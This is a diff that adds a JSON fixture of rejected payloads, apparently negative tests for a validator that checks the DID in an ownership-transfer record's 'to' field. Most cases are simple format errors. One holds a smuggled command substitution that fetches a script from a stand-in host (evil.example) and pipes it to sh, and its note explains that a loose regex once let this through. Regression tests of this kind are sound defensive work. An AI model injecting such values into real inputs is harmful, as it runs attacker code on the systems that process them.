@@ -1,0 +1,50 @@
+[
+  {
+    "note": "`to` is required.",
+    "payload": {
+      "resource": "github.com/acme/widgets"
+    }
+  },
+  {
+    "note": "Ownership is of a repository, not a namespace.",
+    "payload": {
+      "resource": "github.com/acme",
+      "to": "did:webvh:QmBobScid2:acme-vtc.example:bob"
+    }
+  },
+  {
+    "note": "`to` is a DID.",
+    "payload": {
+      "resource": "github.com/acme/widgets",
+      "to": "bob@example.com"
+    }
+  },
+  {
+    "note": "`to` is a DID in the W3C DID Core syntax, whose method-specific id admits only `A-Z a-z 0-9 . - _ :` and percent-encoded octets. `did:[a-z0-9]+:\\S+` let a command substitution through, and a surface that later quoted the value into a shell command ran it.",
+    "payload": {
+      "resource": "github.com/acme/widgets",
+      "to": "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)"
+    }
+  },
+  {
+    "note": "`to` is a DID, and a DID has no whitespace in it.",
+    "payload": {
+      "resource": "github.com/acme/widgets",
+      "to": "did:web:acme-vtc.example:bob evil"
+    }
+  },
+  {
+    "note": "`to` is a bare DID naming a party, not a DID URL: a `#` fragment (a verification-method id) is refused, as are a path and a query.",
+    "payload": {
+      "resource": "github.com/acme/widgets",
+      "to": "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK#z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK"
+    }
+  },
+  {
+    "note": "`to` is a DID, whose method name is lowercase letters and digits only; `did:WebVH:` is not `did:webvh:`, and DIDs are compared by exact string.",
+    "payload": {
+      "resource": "github.com/acme/widgets",
+      "to": "did:WebVH:QmBobScid2:acme-vtc.example:bob"
+    }
+  }
+]
